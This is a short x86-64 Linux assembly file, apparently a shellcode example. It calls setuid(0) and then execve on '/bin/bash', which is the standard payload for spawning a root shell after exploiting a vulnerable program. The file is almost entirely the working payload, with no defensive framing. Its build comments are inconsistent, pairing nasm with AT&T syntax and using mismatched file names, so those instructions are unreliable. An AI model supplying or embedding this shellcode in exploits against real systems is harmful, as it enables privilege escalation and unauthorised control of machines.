# program main
# compile -> as main.s -o main
# dev= > ArkAngeL43
# nasm -f elf64 shellcode_example_test.s 
          #|-> file format
# ld -s -o shellcode_example_test shellcode-example_test.o
# 
# or we can use the standard GNU assembler 
# as shellcode_example_test.s -o main.out
#ld file.out -e shellcode_example_test -o main

.text
.globl _start
_start:
    xor %rdi, %rdi
    pushq   $0x69
    pop     %rax
    syscall
    # push methods
    push    %rdi
    push    %rdi
    pop     %rsi
    pushq   $0x68
    movabs $0x7361622f6e69622f,%rax
    push    %rax
    push    %rsp
    pop     %rdi
    pushq   $0x3b
    pop     %rax
    syscall

